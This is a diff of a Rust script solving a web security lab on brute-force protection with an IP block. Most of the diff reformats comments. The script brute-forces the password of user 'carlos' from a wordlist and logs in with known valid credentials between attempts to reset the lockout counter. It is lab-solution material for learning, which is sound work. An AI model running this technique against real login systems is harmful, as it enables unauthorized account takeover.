@@ -7,7 +7,7 @@
 * Lab: Broken brute-force protection, IP block
 *
 * Steps: 1. Brute force carlos password
-*        2. After every try, login with correct 
+*        2. After every try, login with correct
 *           credentials to bypass blocking
 *
 *****************************************************************/
@@ -48,29 +48,48 @@ lazy_static! {
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a1b00e4045d76eb8237443600e900d8.web-security-academy.net/login"; // change this url
-    let client = build_client(); // build the client which will be used in all subsequent requests
-    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap(); // change the path your list
+    // change this to your lab URL
+    let url = "https://0a1b00e4045d76eb8237443600e900d8.web-security-academy.net/login";
 
-    let start_time = time::Instant::now(); // capture the time before enumeration
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
 
+    // read passwords as one big string
+    // change the path of your passwords list
+    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap();
+
+    // capture the time before enumeration
+    let start_time = time::Instant::now();
+
+    // set valid user
     let valid_user = "carlos";
-    let valid_password = brute_force_password(start_time, url, client, "carlos", passwords); // brute force his password
+
+    // brute force his password
+    let valid_password = brute_force_password(start_time, url, client, "carlos", passwords);
+
+    // if you found a valid password
     match valid_password {
-        // if you found a valid password
         Some(password) => {
-            print_valid_credentials("carlos", &password); // print valid credential
-            save_results(start_time, "results", "carlos", &password);
-            // save resultes to a file in the current working directory
+            // print valid credential
+            print_valid_credentials("carlos", &password);
+
+            // save results  to a file in the current working directory
             // you can change this name to what you want
+            save_results(start_time, "results", "carlos", &password);
         }
         None => {
-            save_results(start_time, "results", "carlos", ""); // save resultes to a file in the current working directory
+            // save results  to a file in the current working directory
+            save_results(start_time, "results", "carlos", "");
+
             println!("{}", "[!] Couldn't find valid password".red());
         }
     }
-    print_finish_message(start_time); // print the total elapsed time
-    print_failed_requests(); // print the failed request to try them later
+
+    print_finish_message(start_time);
+
+    // some request will be failed due to unknow reseaon
+    // print them after you finish to try them later
+    print_failed_requests();
 }
 
 /*******************************************************************
@@ -107,14 +126,24 @@ fn brute_force_password(
         "✅ Valid user: ".white().bold(),
         "carlos".green().bold()
     );
-    let total_counts = passwords.lines().count(); // total number of passwords to try
-                                                  // iterate over the whole list of passwords
+
+    // total number of passwords to try
+    let total_counts = passwords.lines().count();
+
+    // iterate over the whole list of passwords
     for (index, password) in passwords.lines().enumerate() {
-        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed); // update the success counter
-        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); // get the fail counter value
-        let elapsed_time = start_time.elapsed().as_secs() / 60; // get elapse time in minutes
-                                                                // print the update info
+        // update the success counter
+        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
+
+        // get the fail counter value
+        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
+
+        // calculate the elapsed time in minutes
+        let elapsed_time = start_time.elapsed().as_secs() / 60;
+
+        // make one successful login after every one try failed
         if index % 2 == 0 {
+            // login as wiener to make a successfull login
             let login_as_wiener = client
                 .post(url)
                 .form(&HashMap::from([
@@ -122,9 +151,12 @@ fn brute_force_password(
                     ("password", "peter"),
                 ]))
                 .send();
+
+            // if loggin request succeeded
             if let Ok(res) = login_as_wiener {
+                // if a redirection happened which means the login is successful
                 if res.status().as_u16() == 302 {
-                    println!("\n{}", "Send correct creds.. ☑️".blue().bold())
+                    println!("\n{}", "Send correct creds.. OK".blue().bold())
                 } else {
                     println!("\n{}", "[!] Failed to Send correct creds".red().bold());
                 }
@@ -138,6 +170,7 @@ fn brute_force_password(
             }
         }
 
+        // print some useful information
         print_progress(
             elapsed_time,
             fail_counter,
@@ -145,14 +178,21 @@ fn brute_force_password(
             total_counts,
             password,
         );
-        let data = HashMap::from([("username", valid_user), ("password", password)]); // the POST data to send
-        let mut login_as_carlos = client.post(url).form(&data).send(); // try to login_as_carlos
+
+        // the POST data to send
+        let data = HashMap::from([("username", valid_user), ("password", password)]);
+
+        // try to login_as_carlos
+        let mut login_as_carlos = client.post(url).form(&data).send();
+
+        // if the request succeeded
         if let Ok(res) = login_as_carlos {
-            // if the request succeeded
+            // if a redirection happens ( correct password )
             if res.status().as_u16() == 302 {
-                // if a redirection happens ( correct password )
                 println!("");
-                return Some(password.to_string()); // return the valid password
+
+                // return the valid password
+                return Some(password.to_string());
             }
         } else {
             // if the request failed, try to send it again
@@ -240,6 +280,7 @@ fn print_failed_requests() {
         failed_passwords
     )
 }
+
 /*********************************************
 * Function used to save results to a txt file
 **********************************************/
